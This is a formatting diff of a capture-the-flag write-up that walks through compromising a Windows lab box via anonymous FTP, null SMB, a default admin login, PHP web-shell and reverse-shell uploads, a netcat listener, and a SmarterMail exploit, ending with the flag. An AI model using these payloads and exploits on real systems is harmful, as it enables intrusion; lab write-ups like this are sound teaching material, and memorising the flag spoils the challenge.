@@ -1,7 +1,8 @@
 ![ZTW Logo](../../Assets/Hacking_Labs_graphics_pwn_logo_1.png)
 
 # Zero
-Welcome to the Zero write up. 
+
+Welcome to the Zero write up.
 
 - [Zero](#zero)
   - [Recon Phase](#recon-phase)
@@ -28,13 +29,13 @@ Welcome to the Zero write up.
 ## Recon Phase
 
 like every good spy movie, we need to recon the target. During the Recon Phase,
- the focus is on passive information gathering to understand the target's 
- environment without directly interacting with it. This involves collecting 
- publicly available data such as domain names, IP addresses, email addresses, 
- employee information, and social media profiles associated with the target 
- organization. Techniques such as open-source intelligence (OSINT), 
- DNS enumeration, WHOIS queries, and reconnaissance tools aid in gathering 
- this information.
+the focus is on passive information gathering to understand the target's
+environment without directly interacting with it. This involves collecting
+publicly available data such as domain names, IP addresses, email addresses,
+employee information, and social media profiles associated with the target
+organization. Techniques such as open-source intelligence (OSINT),
+DNS enumeration, WHOIS queries, and reconnaissance tools aid in gathering
+this information.
 
 ![selfie with the PwnToOwn machine](../../Assets/)
 
@@ -43,28 +44,27 @@ like every good spy movie, we need to recon the target. During the Recon Phase,
 ![Flyer with details of the PwnToOwn challenge](../../)
 
 The flyer gave us a QR code that goes to the PwnToOwn page. This has lot of
-details about the challenge. 
+details about the challenge.
 
 - We need to connect to the WIFI to even see the PwnToOwn machine.
 - WIFI SSID = `PwnToOwn`, WIFI Password = `ZTW2024!`
 - There are many of the same two boxes hosted on the machine.
-- The box seems to be hosted on the end of the subnet. 
+- The box seems to be hosted on the end of the subnet.
 - IP of the boxes ranges from `10.0.0.247` to `10.0.0.254`
 - Need to submit to the leader board that is hosted on `http://10.0.0.14:80`
-    
 
 ## Enumeration Phase
 
-During the Enumeration Phase of a penetration test, the goal is to gather as 
-much information as possible about the target network or system. This involves 
-actively probing the target to identify potential vulnerabilities, 
-misconfigurations, or weaknesses. Techniques such as port scanning, service 
-identification, banner grabbing, and OS fingerprinting are commonly employed 
+During the Enumeration Phase of a penetration test, the goal is to gather as
+much information as possible about the target network or system. This involves
+actively probing the target to identify potential vulnerabilities,
+misconfigurations, or weaknesses. Techniques such as port scanning, service
+identification, banner grabbing, and OS fingerprinting are commonly employed
 to enumerate the target's infrastructure.
 
-Since we have a list of active machines on the network. We can now pick the 
-machines, that we can attack because of the recon phase we that there are 
-duplicates of the boxes. In this write up we are going to pick `10.0.0.247` 
+Since we have a list of active machines on the network. We can now pick the
+machines, that we can attack because of the recon phase we that there are
+duplicates of the boxes. In this write up we are going to pick `10.0.0.247`
 as our zero machine.
 
 ```bash
@@ -72,19 +72,19 @@ sudo nmap -A -p- -sS  10.0.0.247
 ```
 
 - `-A` - Enable OS detection, version detection, script scanning, and traceroute
-- `-sS` - This option tells nmap to only complete half of the three-way this 
-- will tell ports are open because an open port will send a SYN-ACK back to 
- nmap.
-- `-p-` - Tells nmap to check every port from 1-65535. This will check every 
+- `-sS` - This option tells nmap to only complete half of the three-way this
+- will tell ports are open because an open port will send a SYN-ACK back to
+  nmap.
+- `-p-` - Tells nmap to check every port from 1-65535. This will check every
   port that can possibly be opened.
 
 **Results:**
 
 ```
 Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2024-02-07 14:52 EST
-Nmap scan report for Since we have a list of active machines on the network. We can now pick the 
-machines, that we can attack because of the recon phase we that there are 
-duplicates of the boxes. In this write up we are going to pick `10.0.0.247` 
+Nmap scan report for Since we have a list of active machines on the network. We can now pick the
+machines, that we can attack because of the recon phase we that there are
+duplicates of the boxes. In this write up we are going to pick `10.0.0.247`
 as our zero machine.
 Host is up (0.0039s latency).
 Not shown: 65513 closed tcp ports (reset)
@@ -225,9 +225,9 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 To many new pen testers this might look overwhelming. But if you start with the
- port you know, it will make this process much easier. In this case the most 
- important port to test are the any http and FTP since though are easy to 
- start with.
+port you know, it will make this process much easier. In this case the most
+important port to test are the any http and FTP since though are easy to
+start with.
 
 ### FTP Port 21
 
@@ -240,17 +240,16 @@ ftp anonymous@10.0.0.247
 ```
 
 > Note: When you connect to the server it's going to ask for a password, If the
->  Anonymous user is enabled anything can be the password.
-> 
+> Anonymous user is enabled anything can be the password.
 
-The next command to run the `dir` command to list the what's on the server.  
+The next command to run the `dir` command to list the what's on the server.
 Now we can see the following files:
 
 - Note for dev.txt
 - somethingveryinportin.txt
 - stuff.txt
-  
-But you won't be able to read the files. So, we have to download the files with 
+
+But you won't be able to read the files. So, we have to download the files with
 the `get` command.
 
 ```
@@ -259,8 +258,9 @@ get somethingveryinportin.txt
 get stuff.txt
 ```
 
-After the download the files, we can cat the files. These are what are in each 
+After the download the files, we can cat the files. These are what are in each
 file:
+
 **Note for dev.txt**
 
 ```
@@ -271,7 +271,6 @@ The problem was that the VM was not in bridge mode.
 If you run into the same problem make sure that the vm is in bridge mode.
 Best,
 NetSec Team
-
 ```
 
 **Somethingveryimportin.txt**
@@ -283,9 +282,8 @@ Ray's shopping list
 2.new keyboard
 3.food
 4.a very very small tree
-5.Change the web server user and password from admin:password to something 
+5.Change the web server user and password from admin:password to something
 better.
-
 ```
 
 **stuff**
@@ -297,41 +295,44 @@ To do:
         Back Up Web Server
         Remove SmarterMail
         Install ThreatLocker (ASAP)
-
 ```
 
 From this we learn that we should look for a web server page that can be login
 with `admin:password` and that SmarterMail might be something to look into and
-the last thing if our VMs are not on a bridge adapter then the Boxes can't 
+the last thing if our VMs are not on a bridge adapter then the Boxes can't
 connect back to our attack machine.
 
 ### SMB
 
 Since port 139 and 445 are open we can guess that the windows machine have an
 SMB share open. we can use the `enum4linux` command to get an idea on what
-happening with the SMB services. 
+happening with the SMB services.
 
 ``` bash
 enum4linux -a <Target>
 ```
-- `-a` This will do all the simple enumeration for the SMB service. 
+
+- `-a` This will do all the simple enumeration for the SMB service.
 
 After running the `enum4linux` command we can see that the SMB service allows
 for this username`''` and password`''`. This means that anyone can login to the
 SMB services.
 
-To login with an null user there are two way login on the smb service with kali. 
-1. smbclient
-2. smbmap 
-   
-#### smbclient 
+To login with an null user there are two way login on the smb service with kali.
 
-To use `smbclient` command to connect to the SMB service we need to use this 
+1. smbclient
+2. smbmap
+
+#### smbclient
+
+To use `smbclient` command to connect to the SMB service we need to use this
 command to list the directory on the service.
+
 ```bash
 smbclient --no-pass -L //<IP>
 ```
-- `--no-pass` - This is tell `smbclient` to send null as the password. 
+
+- `--no-pass` - This is tell `smbclient` to send null as the password.
 - `-L` - This tell `smbclient` to list the files on the Share.
 
 Once run this command we can see that the SMB services is hosting a folder
@@ -342,9 +343,10 @@ Now we can use this to login on the SMB share.
 ```bash
 smbclient --no-pass //<IP>/Stuff
 ```
+
 Once you are in you can use `dir` or `ls` command to list the files on the
 share. It seems that the files in the share is the same as the ones on the
-FTP service. 
+FTP service.
 
 #### smbmap
 
@@ -359,16 +361,17 @@ smbmap -H <IP> -p 445
 - `-p` - This tells smbmap what port to connect to.
 
 Now that we can see want in the SMB share we can see the `Stuff` folder. And to
-look into the folder, we can use 
+look into the folder, we can use
 
 ```bash
 smbmap -H <IP> -p 445 -r Stuff
 ```
-This will show what in the `Stuff` directory and its the exact same as the ftp server. 
+
+This will show what in the `Stuff` directory and its the exact same as the ftp server.
 
 ### HTTPs
 
-Hosting web server are the most common way hackers get into a system because 
+Hosting web server are the most common way hackers get into a system because
 it can be access from anywhere.
 
 #### Port 80
@@ -377,7 +380,7 @@ When we connect to port 80, we get the default Windows IIS page.
 
 ![Webpage for port 80](../../Assets/PwnToOwn/IIS_page.png)
 
-When viewing the source page, it does reflect that the pages is the default 
+When viewing the source page, it does reflect that the pages is the default
 window IIS page.
 
 #### Port 443/4629
@@ -386,17 +389,17 @@ On both port 443 and 4629 is a ThreatLocker login page.
 
 ![Webpage for port 443/4629](../../Assets/PwnToOwn/4629_login_page.png)
 
-We can try the admin:password, which works. now we get the home page of the 
-ThreatLocker web page. 
+We can try the admin:password, which works. now we get the home page of the
+ThreatLocker web page.
 
 ![Webpage after logging in](../../Assets/PwnToOwn/4629_after_login.png)
-we can see a file upload page now we can move to the exploit phase now 
+we can see a file upload page now we can move to the exploit phase now
 
-> If you are having problems connecting to port 443, Try using 
+> If you are having problems connecting to port 443, Try using
 > `https://<Machine IP>`
-> If at some point if the site stop responding to you, you might have to find 
-> another zero machine. This is due to the use a reverse shell being used on 
-> that machine by another player. 
+> If at some point if the site stop responding to you, you might have to find
+> another zero machine. This is due to the use a reverse shell being used on
+> that machine by another player.
 
 #### Port 5357
 
@@ -406,30 +409,32 @@ On this web page, we get an error for the web page.
 
 #### Port 9998
 
-On this web page, we see the Smartermail web page. we can try the 
+On this web page, we see the Smartermail web page. we can try the
 `admin:password` we got but doesn't work.
 
 ![Webpage for port 9998](../../Assets/PwnToOwn/smartermail_login_page.png)
 
-The first thing to do is to start googling what is smartermail. Using sites 
-like CVE and searchsploit we can use the keyword `smartermail` can find 
-vulnerability that smartmail has. From our research there are a few 
-vulnerabilitys that smartermail has. Lets take a look at the source 
-code of the web page. 
+The first thing to do is to start googling what is smartermail. Using sites
+like CVE and searchsploit we can use the keyword `smartermail` can find
+vulnerability that smartmail has. From our research there are a few
+vulnerabilitys that smartermail has. Lets take a look at the source
+code of the web page.
 
 ![Source code of the smartermail page](../../Assets/PwnToOwn/4629_source_page.png)
 
-The thing that we saw is that the vat stProductBuild is 6919 and that stProductVersion is 100.0.6919. This 
+The thing that we saw is that the vat stProductBuild is 6919 and that stProductVersion is 100.0.6919. This
 
 ## Exploitation Phase
 
 ### HTTPS Port 443 /4629
+
 Get the Threatlocker login page.
 
 #### Option 1 Command injection page
-This payload is the PHP cmd payload from [ReveShell.com](https://www.revshells.com/) 
-This will make our file upload vulnerability and turn it into a command 
-injection vulnerability, where we can put commands just like if we had a reverse shell. 
+
+This payload is the PHP cmd payload from [ReveShell.com](https://www.revshells.com/)
+This will make our file upload vulnerability and turn it into a command
+injection vulnerability, where we can put commands just like if we had a reverse shell.
 
 ```php
 <html>
@@ -449,12 +454,13 @@ injection vulnerability, where we can put commands just like if we had a reverse
 </body>
 <script>document.getElementById("cmd").focus();</script>
 </html>
-
 ```
 
-
 #### Option 2 reverse shell
-This payload is the PHP Ivan Sincek payload from [ReveShell.com](https://www.revshells.com/) and this will make a reverse shell to our attacker machine. 
+
+This payload is the PHP Ivan Sincek payload from
+[ReveShell.com](https://www.revshells.com/) and this will make a reverse shell
+to our attacker machine.
 
 ```php
 <?php
@@ -638,54 +644,59 @@ unset($sh);
 echo '</pre>';
 ?>
 ```
-For this to work we need to have a listener open on our machine. So we can use 
+
+For this to work we need to have a listener open on our machine. So we can use
 the Netcat command to open a listener on our machine
+
 ```bash
 nc -lnvp port
 ```
+
 - `-l` - This tells the Netcat utility to operate in listen mode.
 - `-n` - This tells the Netcat utility to skil DNS resolution.
 - `-v` - This tells the Netcat utility to operate in verbose mode.
--  `-p` - This tells the Netcat utility what port to open up for the listener. 
-  
+- `-p` - This tells the Netcat utility what port to open up for the listener.
+
 #### After picking an option
 
 Which ever option you chose, now we need to get it to run on the target machine.
-To do this we first have to put our payload into a php file. 
+To do this we first have to put our payload into a php file.
+
 > Note the file need to be a `PHP` and not a `txt` file.
 
-
-
-After we have our php file, all we need to do is to upload the file and after 
-the upload is done. The site told us where the file that we have uploaded have 
-been place on the website. So now we can use that path to navigate to the 
-`../../hackable/uploads/payload.php` file. Once we navigate to the payload 
-file, it will run. 
+After we have our php file, all we need to do is to upload the file and after
+the upload is done. The site told us where the file that we have uploaded have
+been place on the website. So now we can use that path to navigate to the
+`../../hackable/uploads/payload.php` file. Once we navigate to the payload
+file, it will run.
 
 ![Upload file](../../Assets/PwnToOwn/Upload.png)
 
 ![Navigating URL](../../Assets/PwnToOwn/URL.png)
 
 Once you are in the system. Now we can move on to [Getting the Flag](#getting-the-flag)
-### HTTP Port 9998 Smartermail 
+
+### HTTP Port 9998 Smartermail
 
 There are two ways you can exploit this smartermail services.
+
 1. With Metasploit
 2. manual exploit
-   
+
 #### Metasploit
 
-To start with Metasploit we have to launch Metasploit. This can be done
-with:
+To start with Metasploit we have to launch Metasploit. This can be done with:
+
 ```bash
 msfconsole
 ```
 
-now have to find an exploit for smartermail.
-using the following commmand:
+now have to find an exploit for smartermail. using the following commmand:
+
 ```bash
 search smartermail
 ```
+
 You will get the following
 
 ![Smartermail search results](../../Assets/PwnToOwn/metasploit_smartermail.png)
@@ -754,24 +765,23 @@ Now that we have our settings set. Now we can exploit the machine with the
 
 Now that we are in the system now we can look around and [get the flag](#getting-the-flag)
 
-#### Manual Exploitation  
+#### Manual Exploitation
 
 Manual Exploitation is more involved than using metasploit.
 First thing we need to do is to install the exploit.
 there are two way to can install the exploit one is being to open a web browser
 and then going to this site https://www.exploit-db.com/exploits/49216 and ether
-copying it into a python file or downloading it. 
-Another options is to use the `wget` command to install it. 
+copying it into a python file or downloading it.
+Another options is to use the `wget` command to install it.
 
-> This exploit need python, If your using kali you should be fine. 
+> This exploit need python, If your using kali you should be fine.
 
 ```bash
 wget https://www.exploit-db.com/exploits/49216
 ```
-after install the exploit. and use the `cat` command we notice that we have to 
+
+after install the exploit. and use the `cat` command we notice that we have to
 change this part in the exploit.
-
-
 
 ```
 HOST='192.168.1.1'
@@ -780,7 +790,7 @@ LHOST='192.168.1.2'
 LPORT=4444
 ```
 
-you can use any text editor. To change it 
+you can use any text editor. To change it
 we are going to change it to this.
 
 ```
@@ -789,14 +799,15 @@ PORT=17001
 LHOST='<Our attack machine IP>'
 LPORT=5757
 ```
+
 HOST - is the machine we want to use the exploit on, AKA the target.
 PORT - is the port that the exploit will used.
-LHOST - is the IP that the target will used to connect back to our attacker 
+LHOST - is the IP that the target will used to connect back to our attacker
 machine.
 LPORT - is the port that the target used to connect to our attack machine.
 
-Atfer we change the parts that we need to change we can now run the exploit on 
-the target. 
+Atfer we change the parts that we need to change we can now run the exploit on
+the target.
 
 ```bash
 python3 ./49216.py
@@ -804,20 +815,19 @@ python3 ./49216.py
 
 > You need to be in the same directory as the python file.
 
-## Getting The Flag 
+## Getting The Flag
 
-Which ever method you used, now all you have to do is to used `dir` command to 
-list everything the current directory and use the `cd` command to change 
-directory. Since this is a windows box, We should check the `C:\Users\` to see 
-what users are on this computer. When we `dir` the `C:\Users` directory we can 
-see the billy user folder. And with further digging when we dir the 
+Which ever method you used, now all you have to do is to used `dir` command to
+list everything the current directory and use the `cd` command to change
+directory. Since this is a windows box, We should check the `C:\Users\` to see
+what users are on this computer. When we `dir` the `C:\Users` directory we can
+see the billy user folder. And with further digging when we dir the
 `C:\Users\billy\Desktop\` we can see the `Flag.txt` and when we used the `type`
-command we can see the following.  
+command we can see the following.
 
 ```
 ZTW{WINDOWSvdgworuwzuxdryzlcegqpsrxdjmzihfj}
 ```
 
-Now that we have the flag all we need to do is to go to the leader board and 
+Now that we have the flag all we need to do is to go to the leader board and
 submit the flag.
-
